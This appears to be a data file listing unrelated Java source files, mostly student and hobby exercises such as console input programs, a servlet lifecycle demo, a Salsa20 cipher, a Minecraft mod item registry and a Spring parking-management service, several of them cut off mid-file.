    "package com.RESTfulsite;\n\nimport org.junit.Test;\nimport org.junit.experimental.runners.Enclosed;\nimport org.junit.runner.RunWith;\n\nimport java.io.BufferedReader;\nimport java.io.FileNotFoundException;\nimport java.io.FileReader;\nimport java.io.IOException;\n\n@RunWith(Enclosed.class)\npublic class Config {\n\n    @Test\n    public void test1() throws IOException {\n        \n       \n        try {\n            BufferedReader bufferedReader = new BufferedReader(new FileReader(\"./src/Files/FilewithJsonContent.json\"));\n\n            String line = null;\n\n            while ((line = bufferedReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        }\n            catch(FileNotFoundException e){\n                e.printStackTrace();\n            }\n        }\n    }\n\n\n\n\n//        JsonPath.read(string,\"expression\");\n\n//        try {\n//            String postAPIrequestBody = FileUtils.readFileToString(new File(fileinMAin.POST_API_REQUEST_BODY), \"UTF-8\");\n//\n//            Response response = RestAssured\n//                    .given()\n//                    .contentType(ContentType.JSON)\n//                    .body(postAPIrequestBody)\n//                    .baseUri(\"https://restful-booker.herokuapp.com/booking\")\n//                    .when()\n//                    .post()\n//                    .then()\n//                    .assertThat()\n//                    .statusCode(200)\n//                    .extract()\n//                    .response();\n//\n////            Object json = response.body().asString();\n//            JSONArray jsonarray = JsonPath.read(response.body().asString(), \"$.booking.firstname\");\n//        } catch (IOException e) {\n//            throw new RuntimeException(e);\n\n",
    "package vetorrrr;\n\npublic class vetorrrrr {\n    private String nome;\n    private int idade;\n    private char sexo;\n\n    public vetorrrrr(String nome,int idade,char sexo){\n        this.nome=nome;\n        this.idade=idade;\n        this.sexo=sexo;\n    }\n    public void carregar(String nome,int idade){\n        this.nome=nome;\n        this.idade=idade;\n    }\n    public void carregar(String nome,int idade,char sexo){\n        this.carregar(nome, idade);\n        this.sexo=sexo;\n    }\n\n    public void setNome(String nome) {\n        this.nome = nome;\n    }\n\n    public void setIdade(int idade) {\n        this.idade = idade;\n    }\n\n    public void setSexo(char sexo) {\n        this.sexo = sexo;\n    }\n\n    public String getNome() {\n        return nome;\n    }\n\n    public int getIdade() {\n        return idade;\n    }\n\n    public char getSexo() {\n        return sexo;\n    }\n}\n\npackage eita;\n\nimport vetorrrr.vetorrrrr;\n\nimport java.util.Scanner;\n\npublic class vito {\n    public static void main(String[] args) {\n        Scanner ler = new Scanner(System.in);\n        vetorrrrr[] vetorzin= new vetorrrrr[4];\n\n        for (int i = 0; i < vetorzin.length; i++) {\n            System.out.println(\"Nomes:\"+(i+1));\n            System.out.println(\"Digite seu nome:\");\n            String nome= ler.nextLine();\n            System.out.println(\"Digite sua idade:\");\n            int idade= ler.nextInt();\n            System.out.println(\"Digite seu sexo:\");\n            char sexo= ler.next().charAt(0);\n            ler.nextLine();\n            vetorzin[i]=new vetorrrrr(nome,idade,sexo);\n        }\n        for (int i = 0; i < vetorzin.length; i++) {\n            System.out.println(vetorzin[i].getNome()+\",\"+vetorzin[i].getIdade()+\",\"+vetorzin[i].getSexo());\n        }\n    }\n}\n",
    "package com.fatec.sp.gov.br.RepositorioDoBem.Builder;\n\npublic class Alimento{\n    private final String nome;\n    private final double peso;\n    private final int quantidade;\n    private final String validade;\n    \n    private Alimento(Builder builder){\n        this.nome=builder.nome;\n        this.peso=builder.peso;\n        this.quantidade=builder.quantidade;\n        this.validade=builder.validade;\n    }\n\n    public String getNome() {\n        return nome;\n    }\n\n    public double getPeso() {\n        return peso;\n    }\n\n    public int getQuantidade() {\n        return quantidade;\n    }\n\n    public String getValidade() {\n        return validade;\n    }\n\n    public String toString(){\n        return  \"Nome: \" + getNome() + '\\n' +\n                \"Peso: \" + getPeso() + '\\n' +\n                \"Quantidade: \" + getQuantidade() + '\\n' +\n                \"Validade: \" + getValidade();\n    }\n\n    public static class Builder{\n        private String nome;\n        private double peso;\n        private int quantidade;\n        private String validade;\n\n        pubilc Builder nome(String nome){\n            this.nome = nome;\n            return this;\n        }\n\n        public Builder peso(double peso){\n            this.peso = peso;\n            return this;\n        }\n\n        public Builder quantidade(int quantidade){\n            this.quantidade = quantidade;\n            return this;\n        }\n\n        public Builder validade(String validade){\n            this.validade = validade;\n            return this;\n        }\n\n        public Alimento build(){\n            return new Alimento(this);\n        }\n    }\n}",
    "package com.ohgiraffers.section01.xml;\n\nimport jakarta.servlet.ServletException;\nimport jakarta.servlet.ServletRequest;\nimport jakarta.servlet.ServletResponse;\nimport jakarta.servlet.http.HttpServlet;\n\nimport java.io.IOException;\n\npublic class LifeCycleTestServlet extends HttpServlet {\n\n    private int initCount = 1;\n    private int serviceCount = 1;\n    private int destroyCount = 1;\n\n    //\uae30\ubcf8 \uc0dd\uc131\uc790\n    public LifeCycleTestServlet() {\n    }\n\n    @Override\n    public void init() throws ServletException {\n\n        /*\ud544\uae30.\n         *  \ucd5c\ucd08\ub85c \uc11c\ube14\ub9bf \uc694\uccad \uc2dc\uc5d0 \ub3d9\uc791\ud558\ub294 \uba54\uc18c\ub4dc*/\n        System.out.println(\"xml \ub9e4\ud551 init \uba54\uc18c\ub4dc \ud638\ucd9c : \" + initCount++);\n    }\n\n    @Override\n    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {\n        /*\ud544\uae30.\n         *  \uc11c\ube14\ub9bf \ucee8\ud14c\uc774\ub108\uc5d0 \uc758\ud574 \ud638\ucd9c\ub418\uba70 \ucd5c\ucd08 \uc694\uccad \uc2dc\uc5d0\ub294\n         *  init() \uc774\ud6c4\uc5d0 \ub3d9\uc791\ud558\uace0,\n         *  \ub450 \ubc88\uc9f8 \uc694\uccad\ubd80\ud130\ub294 init() \ud638\ucd9c\uc5c6\uc774\n         *  service() \ud638\ucd9c*/\n        System.out.println(\"xml \ub9e4\ud551 service \uba54\uc18c\ub4dc \ud638\ucd9c : \" + serviceCount++);\n    }\n\n    @Override\n    public void destroy() {\n        /*\ud544\uae30.\n         *  \ucee8\ud14c\uc774\ub108\uac00 \uc885\ub8cc\ub420 \ub54c \ud638\ucd9c\ub418\ub294 \uba54\uc18c\ub4dc\uc774\uba70, \uc8fc\ub85c \uc790\uc6d0\uc744\n         *  \ubc18\ub0a9\ud558\ub294 \uc6a9\ub3c4\ub85c \uc0ac\uc6a9\ub41c\ub2e4*/\n        System.out.println(\"xml \ub9e4\ud551 destroy \uba54\uc18c\ub4dc \ud638\ucd9c : \"+destroyCount++);\n\n    }\n}\n\n",
    "package aplicacao;\n\nimport java.util.Scanner;\nimport entidades.Produto;\npublic class Programa {\n\n\tpublic static void main(String[] args) {\n\t\t\n\t\tScanner sc = new Scanner (System.in);\n\t\tProduto produto = new Produto();\n\t\tSystem.out.println(\"Entre com a informa\u00e7\u00e3o de um produto: \");\n\t\tSystem.out.print(\"Nome: \");\n\t\tproduto.nome = sc. nextLine();\n\t\tSystem.out.print(\"Pre\u00e7o: \");\n\t\tproduto.preco = sc.nextDouble();\n\t\tSystem.out.print(\"Quantidade em estoque: \");\n\t\tproduto.quantidade = sc.nextInt();\n\t\tSystem.out.println();\n\t\tSystem.out.println(\"Informa\u00e7\u00f5es do Produto:\" + produto); \n\t\tSystem.out.println();\n\t\tSystem.out.print(\"Entre com o n\u00famero de produtos para ser adicionados: \");\n\t\tint quantidade = sc.nextInt();\n\t\tproduto.adicionarProduto(quantidade);\n\t\tSystem.out.println();\n\t\tSystem.out.println(\"Informa\u00e7\u00f5es do produto: \" + produto);\n\t\tSystem.out.println();\n\t\tSystem.out.print(\"Entre com o n\u00famero de produtos para ser removidos: \");\n\t\tquantidade = sc.nextInt();\n\t\tproduto.removerProduto(quantidade);\n\t\tSystem.out.println();\n\t\tSystem.out.println(\"Informa\u00e7\u00f5es do Produto: \" + produto);sc.close();\n\t\t// TODO Auto-generated method stub\n\t\n\t}\n}\n",
    "package experiment1.temp;\r\n\r\nimport experiment1.util.*;\r\n\r\nimport java.sql.Connection;\r\nimport java.sql.SQLException;\r\nimport java.sql.Statement;\r\n\r\n\r\n/**\r\n * \u529f\u80fd\uff1a\u7528\u6765\u5b8c\u6210\u8868\u7684\u521b\u5efa\r\n \u4e00\u5171\u9700\u8981\u521b\u5efa\u56db\u4e2a\u8868\r\n\r\n */\r\npublic class create {\r\n    public static void main(String[] args) throws SQLException {\r\n        //sql\u64cd\u4f5c\u8bed\u53e5\r\n\r\n\r\n        //\u521b\u5efa\u56fe\u4e66\u8868\r\n        String sql1=\"create table books\" +\r\n                \"(bNo char(30) primary key,\" +\r\n                \"bName varchar(20),\" +\r\n                \"bPublish varchar(20),\" +\r\n                \"bDate date,\" +\r\n                \"bPrice float check(bPrice>0),\" +\r\n                \"bNum int check(bNum>=0));\";\r\n\r\n        //\u521b\u5efa\u501f\u9605\u7528\u6237\u8868\r\n        String sql2=\"create table borrowPerson\" +\r\n                \"(pNo char(15) primary key,\" +\r\n                \"pName varchar(20),\" +\r\n                \"pSex char(2) check(pSex='\u7537' or pSex='\u5973'),\" +\r\n                \"pDate date);\";\r\n\r\n        //\u767b\u5f55\u7528\u6237\u5b58\u50a8\u8868\r\n        String sql3=\"create table loginUser\" +\r\n                \"(account char(25) primary key,\" +\r\n                \"password char(20),\" +\r\n                \"identity char(20));\";\r\n\r\n        //\u501f\u9605\u4eba\u5458\u4e0e\u56fe\u4e66\u7684\u501f\u9605\u5173\u7cfb\u8868\r\n        String sql4=\"create table book_borrowPerson\" +\r\n                \"(bNo char(30),\" +\r\n                \"pNo char(15),\" +\r\n                \"pState int(1) check(pState=0 or pState=1),\" +\r\n                \"primary key(bNo,pNo),\" +\r\n                \"foreign key(bNo)references books(bNo),\" +\r\n                \"foreign key(pNo)references borrowPerson(pNo));\";\r\n        //\u83b7\u53d6\u8fde\u63a5\r\n        Connection connection=connectionUtils.getConnection();\r\n        Statement statement=null;\r\n        try {\r\n            statement = connection.createStatement();\r\n            statement.executeUpdate(sql1);\r\n            statement.executeUpdate(sql2);\r\n            statement.executeUpdate(sql3);\r\n            statement.executeUpdate(sql4);\r\n        } catch (SQLException ex) {\r\n            throw new RuntimeException(ex);\r\n        }\r\n        finally {\r\n            //\u5173\u95ed\u8fde\u63a5\r\n            connectionUtils.closeConnection(connection, statement, null);\r\n        }\r\n    }\r\n}\r\n",
    "package AsynchronousJava;\n\n\n//1. thenApply\n//\n//        thenApply is used to perform an operation on the result of a\n//        CompletableFuture and return a new CompletableFuture with the\n//        result of the operation. It takes a Function as an argument,\n//        which specifies the transformation to be applied to the result.\n\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutionException;\n\npublic class CompletableFutureMethods {\n    //then apply\n    public static void main(String[] args) throws ExecutionException, InterruptedException {\n       CompletableFuture.supplyAsync(() -> {\n            return \"ajit\";\n        }).thenApply((res) -> {\n            return res + \"1\";\n        }).thenApply((res) -> {\n            return res + \"2\";\n        }).thenAccept((res) -> System.out.println(res)).join();\n\n       //then compose\n\n        CompletableFuture<Integer> future = CompletableFuture.supplyAsync(() -> 10);\n\n        CompletableFuture<Integer> resultFuture = future.thenCompose(value ->\n                CompletableFuture.supplyAsync(() -> value * 2));\n\n        System.out.println(resultFuture.get());\n\n        //then Combine\n\n        CompletableFuture<Integer> future1 = CompletableFuture.supplyAsync(() -> 10);\n        CompletableFuture<Integer> future2 = CompletableFuture.supplyAsync(() -> 20);\n\n        CompletableFuture<Integer> resultFuture2 = future1.thenCombine(future2, (value1, value2) -> value1 + value2);\n\n        System.out.println(resultFuture2.get());\n\n\n        //then combine second example\n\n        CompletableFuture<Double> futurePrice = CompletableFuture.supplyAsync(()->{\n            System.out.println(\"in first task ..\");\n            try {\n                Thread.sleep(10000);\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n            return 100.0;\n        });\n\n        CompletableFuture<Double> discountPrice = CompletableFuture.supplyAsync(()->{\n            System.out.println(\"in second task\");\n            try {\n                Thread.sleep(10000);\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n\n            return 14.0;\n        });\n\n        futurePrice.thenCombine(discountPrice,(p1,p2)->{\n            System.out.println(\"in combine\");\n            try {\n                Thread.sleep(16000);\n            } catch (InterruptedException e) {\n                throw new RuntimeException(e);\n            }\n            return p1-p2;\n        }).thenAccept((price)-> System.out.println(\"after discount, final price : \"+ price)).join();\n\n\n\n    }\n\n\n}\n\n",
    "package edu.pitt.cs;\n\nimport org.mockito.*;\n\npublic interface Cat {\n\tpublic static Cat createInstance(InstanceType type, int id, String name) {\n\t\tswitch (type) {\n\t\t\tcase IMPL:\n\t\t\t\treturn new CatImpl(id, name);\n\t\t\tcase BUGGY:\n\t\t\t\treturn new CatBuggy(id, name);\n\t\t\tcase SOLUTION:\n\t\t\t\treturn new CatSolution(id, name);\n\t\t\tcase MOCK:\n\t\t\t\tCat c = Mockito.mock(Cat.class);\n\t\t\t\t// I have a hunch that  Gradescope requires the lines below\n\t\t\t\tMockito.when(c.getId()).thenReturn(id);\n\t\t\t\tMockito.when(c.getName()).thenReturn(name);\n\t\t\t\tMockito.when(c.toString()).thenReturn(\"ID \" + id + \". \" + name);\n\t\t\t\t\n\t\t\t\treturn c;\n\t\t\tdefault:\n\t\t\t\tassert(false);\n\t\t\t\treturn null;\n\t\t}\n\t}\n\n\t// WARNING: You are not allowed to change any part of the interface.\n\t// That means you cannot add any method nor modify any of these methods.\n\t\n\tpublic void rentCat();\n\n\tpublic void returnCat();\n\n\tpublic void renameCat(String name);\n\n\tpublic String getName();\n\n\tpublic int getId();\n\n\tpublic boolean getRented();\n\n\tpublic String toString();\n}\n",
    "package Lab2_Week2.Q2;\nimport java.lang.Math;\n\npublic class Food {\n    private String givenFood;\n    private double totalCalories, fatGram;\n\n    public Food(){\n        this.givenFood = \"\";\n        this.fatGram = 0.0;\n        this.totalCalories = 0.0;\n    }\n    public Food(String givenFood, double totalCalories, double fatGram) {\n        setGivenFood(givenFood);\n        setTotalCalories(totalCalories);\n        setFatGram(fatGram);\n    }\n    public void setGivenFood(String givenFood){\n        this.givenFood = givenFood;\n    }\n    public void setFatGram(double fatGram) {\n        this.fatGram = fatGram;\n    }\n    public void setTotalCalories(double totalCalories) {\n        this.totalCalories = totalCalories;\n    }\n    public String getGivenFood(){\n        return this.givenFood;\n    }\n    public double getFatGram() {\n        return fatGram;\n    }\n    public double getTotalCalories() {\n        return totalCalories;\n    }\n    public double calcCalFromFat(){\n        return getFatGram() * 9;\n    }\n    public double calcPercentage(){\n            return (calcCalFromFat() / this.totalCalories) * 100;\n    }\n    public boolean checkValid(){\n        return calcCalFromFat() < getTotalCalories();\n    }\n\n    @Override\n    public String toString() {\n        if (checkValid())\n            return this.givenFood + \" Have a Total Calorie of \" + this.totalCalories + \" with \" + this.fatGram + \"g of fat\\nPercentage of Calories From Fat is : \" + Math.round(calcPercentage()*100.0) / 100.0 + \"%\\n\";\n        else\n            return \"Input is Invalid\";\n    }\n}\n",
    "import java.util.LinkedList;\n\npublic class Main {\n    public static void main(String[] args) {\n        System.out.println(\"This is my attempt at reversing a linked list without using the internet or any other external\" +\n                \"resources. Just good ol' trial and error. Wish me luck.\");\n\n        LinkedList<String> myList = new LinkedList<>();\n\n\n        //add 10 new elements to linked list\n        for(int i =0; i<10; i++) {\n            myList.add(i, \"E\"+i);\n        }\n        //print for validation\n        System.out.println(\"Initial linked list:\");\n        System.out.println(myList);\n\n\n        //heck yeah. built-in function, baby.\n        System.out.println(\"Using the built-in function:\");\n        System.out.println(myList.reversed());\n\n\n        //kidding...\n\n\n        System.out.println(\"Using the for loop:\");\n        //create list to copy to\n        LinkedList<String> copyList =new LinkedList<>();\n\n        //use basic for loop.\n        for(int  i = myList.size()-1; i!=-1; i--){\n            copyList.add(myList.get(i));\n        }\n        System.out.println(copyList);\n        System.out.println(copyList.get(2));\n        //all in all I think that went pretty well, especially for not allowing myself to use any outside resource.\n        //Of course, I could've googled the answer, but where's the fun in that? I want to learn.\n        //lol\n\n\n\n    }\n}",
    "import java.io.*;\n\npublic class Salsa20 {\n    byte[] key;\n    byte[] nonce;\n\n    /**\n     * constructor used only for testing purposes\n     */\n    public Salsa20() {}\n\n    /**\n     * This constructor takes both key and nonce as strings and converts them to bytes. If a nonce should be zero,\n     * an empty String should be provided. The constructor lets the user choose whether they want to operate on\n     * a 16-bit or a 32-bit key. If given key or nonce Strings are longer than their byte sizes, they are truncated\n     * @param key the 16 or 32-bit key\n     * @param nonce the\n     * @param keyMode\n     */\n    public Salsa20(String key, String nonce, int keyMode) {\n        if ( keyMode != 32 && keyMode != 16 ) {\n            IllegalArgumentException e = new IllegalArgumentException(\"Illegal argument in the constructor!\");\n            throw e;\n        }\n        this.nonce = new byte[8];\n\n        byte[] keyBytes = key.getBytes();\n        byte[] nonceBytes = nonce.getBytes();\n\n        // Filling the key array to chosen length\n        int length = key.length();\n        if (length <= keyMode) {\n            this.key = new byte[keyMode];\n            fillToKeySize(keyBytes, length, keyMode);\n        } else {\n            this.key = new byte[keyMode];\n            for (int i = 0; i < keyMode; i++) {\n                this.key[i] = keyBytes[i];\n            }\n        }\n        // Filling the nonce to proper length\n        length = nonceBytes.length;\n        if ( length < 8 ) {\n            fillNonce(nonceBytes, length);\n        } else if ( length == 8 ) {\n            this.nonce = nonceBytes;\n        } else {\n            for (int i = 0; i < 8; i++) {\n                this.nonce[i] = nonceBytes[i];\n            }\n        }\n    }\n\n    /**\n     * Helper method. Used in the constructor to fill a nonce, which was given a value shorter than 8 bytes\n     * @param input\n     * @param currentLength\n     */\n    private void fillNonce(byte[] input, int currentLength) {\n        int i = 0;\n        for ( ; i < currentLength; i++ ) {\n            nonce[i] = input[i];\n        }\n        for ( ; i < 8; i++ ) {\n            nonce[i] = 0;\n        }\n    }\n\n    /**\n     * Helper method for the constructor. Used for filling the key, which was given a value shorter than the specified one\n     * @param givenKey the key bytes taken from String\n     * @param currentLength the length of the key byte array\n     * @param desiredLength the key length chosen by the user\n     */\n    private void fillToKeySize(byte[] givenKey, int currentLength, int desiredLength) {\n        for (int i = 0; i < currentLength; i++) {\n            key[i] = givenKey[i];\n        }\n        for (int i = currentLength; i < desiredLength; i++) {\n            key[i] = 0;\n        }\n    }\n\n    public int[] quarterRound(int x0, int x1, int x2, int x3) {\n        int[] x = {x0, x1, x2, x3};\n        x[1] = x[1] ^ (Integer.rotateLeft( (x[0] + x[3]), 7) );\n        x[2] = x[2] ^ (Integer.rotateLeft( (x[1] + x[0]), 9) );\n        x[3] = x[3] ^ (Integer.rotateLeft( (x[2] + x[1]), 13) );\n        x[0] = x[0] ^ (Integer.rotateLeft( (x[3] + x[2]), 18) );\n        return x;\n    }\n    public int[] rowRound(int[] x) {\n        if (x.length != 16) {throw new IllegalArgumentException(\"rowRound\");}\n\n        int[] result = new int[16];\n        // 1st four values\n        int[] temp = quarterRound(x[0], x[1], x[2], x[3]);\n        for (int i = 0; i < 4; i++) {\n            result[i] = temp[i];\n        }\n\n        // 2nd four values\n        temp = quarterRound(x[5], x[6], x[7], x[4]);\n        result[5] = temp[0];\n        result[6] = temp[1];\n        result[7] = temp[2];\n        result[4] = temp[3];\n\n        // 3rd four values\n        temp = quarterRound(x[10], x[11], x[8], x[9]);\n        result[10] = temp[0];\n        result[11] = temp[1];\n        result[8] = temp[2];\n        result[9] = temp[3];\n\n        // 4th four values\n        temp = quarterRound(x[15], x[12], x[13], x[14]);\n        result[15] = temp[0];\n        result[12] = temp[1];\n        result[13] = temp[2];\n        result[14] =temp[3];\n        return result;\n    }\n\n    public int[] columnRound(int[] x) {\n        if (x.length != 16) { throw new IllegalArgumentException(\"ColumnRound\"); }\n\n        int[] result = new int[16];\n        int[] temp = new int[4];\n\n        // 1st four values\n        temp = quarterRound(x[0], x[4], x[8], x[12]);\n        for (int i = 0; i < 4; i++) {\n            result[(4 * i) % 16] = temp[i];\n        }\n\n        // 2nd four values\n        temp = quarterRound(x[5], x[9], x[13], x[1]);\n        for (int i = 0; i < 4; i++) {\n            result[((4 * i) + 5) % 16] = temp[i];\n        }\n\n        // 3rd four values\n        temp = quarterRound(x[10], x[14], x[2], x[6]);\n        for (int i = 0; i < 4; i++) {\n            result[((4 * i) + 10) % 16] = temp[i];\n        }\n\n        // 4th four values\n        temp = quarterRound(x[15], x[3], x[7], x[11]);\n        for (int i = 0; i < 4; i++) {\n            result[((4 * i) + 15) % 16] = temp[i];\n        }\n\n   ",
    "package action;\r\n\r\nimport java.time.*;\r\n\r\npublic class Action {\r\n    private int actionId;\r\n    private LocalDateTime localDateTime;\r\n    private boolean isAddition;\r\n    private int lineNumber;\r\n    private String text;\r\n\r\n    public Action (int actionId, LocalDateTime localDateTime, boolean isAddition, int lineNumber, String text) {\r\n        this.actionId = actionId;\r\n        this.localDateTime = localDateTime;\r\n        this.isAddition = isAddition;\r\n        this.lineNumber = lineNumber;\r\n        this.text = text;\r\n    }\r\n\r\n    public Action() {\r\n        \r\n    }\r\n\r\n    public int getActionId() {\r\n        return this.actionId;\r\n    }\r\n\r\n    public void setActionId(int actionId) {\r\n        this.actionId = actionId;\r\n    }\r\n\r\n    public LocalDateTime getLocalDateTime() {\r\n        return this.localDateTime;\r\n    }\r\n\r\n    public boolean getIsAddition() {\r\n        return this.isAddition;\r\n    }\r\n\r\n    public int getLineNumber() {\r\n        return this.lineNumber;\r\n    }\r\n\r\n    public String getText() {\r\n        return this.text;\r\n    }\r\n}",
    "package barch.tsm.Carcases;\n\nimport barch.tsm.Glue.ItemGrouped;\nimport barch.tsm.Glue.ItemGrouper;\nimport net.fabricmc.fabric.api.item.v1.FabricItemSettings;\nimport net.minecraft.item.ItemGroups;\nimport net.minecraft.item.Items;\nimport net.minecraft.registry.Registries;\nimport net.minecraft.registry.Registry;\nimport net.minecraft.util.Identifier;\n\nimport static barch.tsm.Foods.Meat.*;\nimport static barch.tsm.TheSkinningMod.CARCASES_GROUP;\nimport static barch.tsm.TheSkinningMod.NAMESPACE;\nimport static barch.tsm.Carcases.AnimalByproducts.*;\n\npublic class Carcases {\n\n    //                              HIDE\n// ================================================================>\n\n    public static final CarcaseItem COW_HIDE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/cow_hide\"),\n            Items.AIR\n    );\n    public static final CarcaseItem SOFT_HIDE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/soft_hide\"),\n            Items.AIR\n    );\n    public static final CarcaseItem BEAR_HIDE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/bear_hide\"),\n            Items.AIR\n    );\n\n//                               COW\n// ================================================================>\n\n    public static final CarcaseItem MEATLESS_COW_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/meatless_cow_carcase\"),\n            Items.AIR\n    );\n    public static final CarcaseItem SKINLESS_COW_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/skinless_cow_carcase\"),\n            MEATLESS_COW_CARCASE\n    );\n    public static final CarcaseItem COW_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/cow_carcase\"),\n            SKINLESS_COW_CARCASE\n    );\n\n//                             SHEEP\n// ================================================================>\n\n    public static final CarcaseItem MEATLESS_SHEEP_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/meatless_sheep_carcase\"),\n            Items.AIR\n    );\n    public static final CarcaseItem SKINLESS_SHEEP_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/skinless_sheep_carcase\"),\n            MEATLESS_SHEEP_CARCASE\n    );\n    public static final CarcaseItem SHEEP_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/sheep_carcase\"),\n            SKINLESS_SHEEP_CARCASE\n    );\n\n//                             CHICKEN\n// ================================================================>\n\n    public static final CarcaseItem MEATLESS_CHICKEN_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/meatless_chicken_carcase\"),\n            Items.AIR\n    );\n    public static final CarcaseItem SKINLESS_CHICKEN_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/skinless_chicken_carcase\"),\n            MEATLESS_CHICKEN_CARCASE\n    );\n    public static final CarcaseItem CHICKEN_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/chicken_carcase\"),\n            SKINLESS_CHICKEN_CARCASE\n    );\n\n//                               PIG\n// ================================================================>\n\n    public static final CarcaseItem MEATLESS_PIG_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/meatless_pig_carcase\"),\n            Items.AIR\n    );\n    public static final CarcaseItem SKINLESS_PIG_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/skinless_pig_carcase\"),\n            MEATLESS_PIG_CARCASE\n    );\n    public static final CarcaseItem PIG_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/pig_carcase\"),\n            SKINLESS_PIG_CARCASE\n    );\n\n//                             SALMON\n// ================================================================>\n\n    public static final CarcaseItem MEATLESS_SALMON_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/meatless_salmon_carcase\"),\n            Items.AIR\n    );\n    public static final CarcaseItem SCALED_SALMON_CARCASE = new CarcaseItem(\n            new FabricItemSettings(),\n            new Identifier(NAMESPACE, \"carcases/scaled_salmon_carcase\"),\n            MEATLESS_SALMON_CARCASE\n    );\n    public static final CarcaseItem SALMON_CARCASE = new CarcaseItem(\n            new FabricItemSetti",
    "package com.smart.module.car.service.impl;\n\nimport cn.hutool.core.io.FileUtil;\nimport com.smart.common.constant.SystemConstant;\nimport com.smart.common.dynamicquery.DynamicQuery;\nimport com.smart.common.model.PageBean;\nimport com.smart.common.model.Result;\nimport com.smart.common.util.DateUtils;\nimport com.smart.common.util.ExcelExport;\nimport com.smart.common.util.ShiroUtils;\nimport com.smart.module.car.entity.CarManage;\nimport com.smart.module.car.repository.CarManageRepository;\nimport com.smart.module.car.service.CarManageService;\nimport com.smart.module.finance.entity.Order;\nimport com.smart.module.finance.service.OrderService;\nimport com.smart.module.sys.entity.SysUser;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.poi.openxml4j.exceptions.InvalidFormatException;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.PageRequest;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\nimport org.springframework.util.ClassUtils;\n\nimport javax.annotation.Resource;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.sql.Timestamp;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.Map;\n\n@Service\npublic class CarManageServiceImpl implements CarManageService {\n\n    @Resource\n    private DynamicQuery dynamicQuery;\n    @Resource\n    private CarManageRepository carManageRepository;\n    @Resource\n    private OrderService orderService;\n\n    @Override\n    @Transactional(rollbackFor=Exception.class)\n    public Result save(CarManage entity) {\n        if(entity.getId()==null){\n            entity.setGmtCreate(DateUtils.getTimestamp());\n            entity.setGmtModified(entity.getGmtCreate());\n        }else{\n            entity.setGmtModified(DateUtils.getTimestamp());\n        }\n        carManageRepository.saveAndFlush(entity);\n        return Result.ok(\"\u4fdd\u5b58\u6210\u529f\");\n    }\n\n    @Override\n    public Result list(CarManage entity) {\n        String nativeSql = \"SELECT COUNT(*) FROM app_car_manage \";\n        nativeSql += common(entity);\n        Long count = dynamicQuery.nativeQueryCount(nativeSql);\n        PageBean<CarManage> data = new PageBean<>();\n        if(count>0){\n            nativeSql = \"SELECT * FROM app_car_manage \";\n            nativeSql += common(entity);\n            nativeSql += \" ORDER BY gmt_create desc\";\n            Pageable pageable = PageRequest.of(entity.getPageNo(),entity.getPageSize());\n            List<CarManage> list =  dynamicQuery.nativeQueryPagingList(CarManage.class,pageable,nativeSql);\n            data = new PageBean(list,count);\n        }\n        return Result.ok(data);\n    }\n\n    @Override\n    public CarManage getByPlateNumber(String plateNumber, Long parkManageId) {\n        String nativeSql = \"SELECT * FROM app_car_manage WHERE plate_number=? AND park_manage_id=? \";\n        CarManage carManage =\n                dynamicQuery.nativeQuerySingleResult(CarManage.class,nativeSql,plateNumber,parkManageId);\n        return carManage;\n    }\n\n    @Override\n    @Transactional(rollbackFor=Exception.class)\n    public Result renew(Order entity) {\n        SysUser user = ShiroUtils.getUserEntity();\n        entity.setOrgId(user.getOrgId());\n        entity.setUserCreate(user.getUserId());\n        entity.setBody(\"\u8f66\u4f4d\u7eed\u79df\");\n        entity.setStatus(SystemConstant.PAY_STATUS_YES);\n        orderService.save(entity);\n        Timestamp validityTime = entity.getValidityTime();\n        String nativeSql = \"UPDATE app_car_manage SET validity_time=? WHERE id=?\";\n        dynamicQuery.nativeExecuteUpdate(nativeSql,validityTime,entity.getCarId());\n        return Result.ok();\n    }\n\n    @Override\n    @Transactional(readOnly = true)\n    public ExcelExport exportData(Long orgId,Long parkManageId) throws IOException, InvalidFormatException {\n        SysUser user = ShiroUtils.getUserEntity();\n        Map<String, Integer> dataMap = new LinkedHashMap<>();\n        dataMap.put(\"org_name\", ExcelExport.CELL_ALIGN_LEFT);\n        dataMap.put(\"park_manage_name\", ExcelExport.CELL_ALIGN_LEFT);\n        dataMap.put(\"plate_number\", ExcelExport.CELL_ALIGN_LEFT);\n        dataMap.put(\"nickname\", ExcelExport.CELL_ALIGN_LEFT);\n        dataMap.put(\"type\", ExcelExport.CELL_ALIGN_LEFT);\n        dataMap.put(\"status\", 